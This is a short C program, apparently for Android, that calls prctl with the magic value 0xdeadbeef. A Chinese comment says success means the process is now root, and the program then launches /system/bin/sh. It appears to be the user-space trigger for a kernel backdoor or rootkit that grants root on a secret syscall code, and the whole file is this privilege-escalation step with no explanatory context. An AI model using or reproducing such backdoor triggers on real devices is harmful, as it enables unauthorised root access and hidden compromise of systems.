#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>

int main(){
    int32_t result = 0;
    prctl(0xdeadbeef, 0, 0, 0, &result);
    // 成功了就已经是root进程了
    system("/system/bin/sh");
    return 0;
}
